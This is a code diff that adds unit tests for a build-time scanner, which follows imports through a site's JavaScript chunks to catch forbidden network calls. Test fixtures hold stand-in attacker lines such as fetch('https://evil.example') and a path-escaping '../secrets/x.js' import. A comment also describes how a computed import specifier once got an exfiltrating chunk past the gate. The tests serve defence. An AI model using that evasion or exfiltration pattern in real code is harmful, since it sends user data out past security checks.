@@ -114,6 +114,86 @@ describe("scanPages — network reach, inline and bundled", () => {
   });
 });
 
+describe("scanPages — transitive chunk scan (clause 5)", () => {
+  const declared = { "index.html": { inline: 0, external: 1 } };
+  const html = '<script src="/_astro/entry.abc123.js"></script>';
+  /** An asset tree: an entry bundle that lazily imports a chunk, as Rollup actually emits it. */
+  const tree = (chunkBody, specifier = './data.def456.js') => (src) =>
+    ({
+      "/_astro/entry.abc123.js": `import(${JSON.stringify(specifier)});`,
+      "/_astro/data.def456.js": chunkBody,
+    })[src] ?? null;
+
+  it("passes when the imported chunk is clean", () => {
+    expect(scanPages(page("index.html", html), declared, tree("const rows=[];"))).toEqual([]);
+  });
+
+  it("catches a forbidden call in a chunk reachable only from inside the bundle", () => {
+    // The case this clause exists for: before it, the 4 KB entry bundle was read and the
+    // 342 KB chunk it pulls in was not, so the scan looked complete over half of what ships.
+    const failures = scanPages(page("index.html", html), declared, tree("new WebSocket('wss://x');"));
+    expect(failures).toEqual([expect.stringMatching(/data\.def456\.js calls .*WebSocket/)]);
+  });
+
+  it("follows a STATIC import as well as a dynamic one", () => {
+    const readAsset = (src) =>
+      ({
+        "/_astro/entry.abc123.js": 'import{x}from"./data.def456.js";',
+        "/_astro/data.def456.js": "fetch('/x');",
+      })[src] ?? null;
+    const failures = scanPages(page("index.html", html), declared, readAsset);
+    expect(failures).toEqual([expect.stringMatching(/data\.def456\.js calls .*fetch/)]);
+  });
+
+  it("bars a chunk that escapes the build directories, and one that leaves the origin", () => {
+    const escaped = scanPages(page("index.html", html), declared, tree("", "../secrets/x.js"));
+    expect(escaped).toEqual([expect.stringMatching(/outside \/_astro\/ or \/js\//)]);
+
+    const offOrigin = scanPages(page("index.html", html), declared, tree("", "https://evil.example/x.js"));
+    expect(offOrigin).toEqual([expect.stringMatching(/non-relative specifier.*never a bare or off-origin/)]);
+  });
+
+  it("fails a chunk that does not resolve, rather than passing over the gap", () => {
+    const readAsset = (src) => (src === "/_astro/entry.abc123.js" ? 'import("./missing.js");' : null);
+    const failures = scanPages(page("index.html", html), declared, readAsset);
+    expect(failures).toEqual([expect.stringMatching(/missing\.js does not resolve/)]);
+  });
+
+  it("fails closed on an import whose specifier is not a string literal", () => {
+    // The evasion: hoist the specifier into a variable. It matches no literal pattern, so a scan
+    // that merely "found no specifiers" would report a clean tree while never opening the chunk —
+    // clause 5's own hole, one level down. Reproduced against the real build before this landed:
+    // a computed specifier plus an exfiltrating chunk passed the gate green.
+    const readAsset = (src) =>
+      ({
+        "/_astro/entry.abc123.js": 'const u="./data.def456.js";import(u);',
+        "/_astro/data.def456.js": "fetch('https://evil.example');",
+      })[src] ?? null;
+    const failures = scanPages(page("index.html", html), declared, readAsset);
+    expect(failures).toEqual([expect.stringMatching(/carries 1 import\(s\) whose specifier is not a string literal/)]);
+  });
+
+  it("counts a computed specifier even when other specifiers ARE literal", () => {
+    const readAsset = (src) =>
+      ({
+        "/_astro/entry.abc123.js": 'import("./data.def456.js");const u=x;import(u);',
+        "/_astro/data.def456.js": "const rows=[];",
+      })[src] ?? null;
+    const failures = scanPages(page("index.html", html), declared, readAsset);
+    expect(failures).toEqual([expect.stringMatching(/carries 1 import\(s\)/)]);
+  });
+
+  it("terminates on a cyclic import graph and reads each chunk once", () => {
+    const reads = [];
+    const readAsset = (src) => {
+      reads.push(src);
+      return src === "/_astro/entry.abc123.js" ? 'import("./data.def456.js");' : 'import("./entry.abc123.js");';
+    };
+    expect(scanPages(page("index.html", html), declared, readAsset)).toEqual([]);
+    expect(reads).toEqual(["/_astro/entry.abc123.js", "/_astro/data.def456.js"]);
+  });
+});
+
 describe("scanPages — inline handlers", () => {
   it("fails an inline event-handler attribute on any page, not just the entry page", () => {
     const declared = { "terms/index.html": { inline: 0, external: 0 } };
